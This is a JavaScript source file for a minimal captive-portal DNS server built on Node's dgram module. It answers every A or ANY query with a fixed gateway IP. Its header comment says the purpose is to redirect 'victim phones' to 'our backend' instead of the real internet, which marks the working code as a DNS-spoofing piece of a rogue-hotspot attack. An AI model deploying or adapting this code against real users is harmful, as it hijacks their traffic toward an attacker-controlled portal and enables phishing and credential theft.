/**
 * Minimal captive-portal DNS server.
 *
 * Listens on UDP port 53 and answers every A-record query with the
 * hotspot gateway IP so victim phones redirect their HTTP probe to
 * our backend (port 4000) instead of the real internet.
 *
 * No third-party packages — uses Node's built-in `dgram` module.
 */

'use strict';

const dgram = require('node:dgram');

// ── DNS wire-format helpers ───────────────────────────────────────────────────

function parseName(buf, offset) {
  const labels = [];
  let jumped = false;
  let end = -1;
  let safetyLimit = 128;

  while (safetyLimit-- > 0) {
    const len = buf[offset];
    if (len === undefined || len === 0) {
      if (!jumped) end = offset + 1;
      break;
    }
    // Pointer (compression)
    if ((len & 0xc0) === 0xc0) {
      if (!jumped) end = offset + 2;
      offset = ((len & 0x3f) << 8) | buf[offset + 1];
      jumped = true;
      continue;
    }
    labels.push(buf.slice(offset + 1, offset + 1 + len).toString('ascii'));
    offset += 1 + len;
  }

  return { name: labels.join('.'), end: end === -1 ? offset + 1 : end };
}

function encodeName(name) {
  const parts = name.split('.');
  const bufs = parts.map((p) => {
    const b = Buffer.alloc(1 + p.length);
    b[0] = p.length;
    b.write(p, 1, 'ascii');
    return b;
  });
  return Buffer.concat([...bufs, Buffer.alloc(1)]); // trailing 0
}

function buildResponse(queryBuf, gatewayIP) {
  // Parse query header
  const txId   = queryBuf.slice(0, 2);
  const qdCount = queryBuf.readUInt16BE(4);
  if (qdCount === 0) return null;

  // Parse question section
  const { name, end: qEnd } = parseName(queryBuf, 12);
  const qType  = queryBuf.readUInt16BE(qEnd);
  const qClass = queryBuf.readUInt16BE(qEnd + 2);

  // Only answer A (1) and ANY (255) queries
  if (qType !== 1 && qType !== 255) return null;

  // Header: ID | QR=1 AA=1 RD=1 RA=1 | RCODE=0 | qdcount=1 | ancount=1 | 0 | 0
  const header = Buffer.alloc(12);
  txId.copy(header, 0);
  header.writeUInt16BE(0x8480, 2); // QR=1, AA=1, RD=1, RA=1
  header.writeUInt16BE(1, 4);      // qdcount
  header.writeUInt16BE(1, 6);      // ancount
  header.writeUInt16BE(0, 8);
  header.writeUInt16BE(0, 10);

  // Echo question
  const question = queryBuf.slice(12, qEnd + 4);

  // Answer RR: name pointer (0xc00c → offset 12), type A, class IN, TTL 0, rdlength 4, ip
  const answer = Buffer.alloc(16);
  answer.writeUInt16BE(0xc00c, 0); // pointer to question name
  answer.writeUInt16BE(1, 2);      // type A
  answer.writeUInt16BE(1, 4);      // class IN
  answer.writeUInt32BE(0, 6);      // TTL 0 (no caching — keep popup fresh)
  answer.writeUInt16BE(4, 10);     // rdlength
  gatewayIP.split('.').forEach((octet, i) => { answer[12 + i] = parseInt(octet, 10); });

  return Buffer.concat([header, question, answer]);
}

// ── Public API ────────────────────────────────────────────────────────────────

function createDNSServer(gatewayIP) {
  const server = dgram.createSocket('udp4');

  server.on('message', (msg, rinfo) => {
    try {
      const resp = buildResponse(msg, gatewayIP);
      if (resp) {
        server.send(resp, rinfo.port, rinfo.address);
      }
    } catch {
      // Malformed packet — ignore
    }
  });

  return server;
}

module.exports = { createDNSServer };
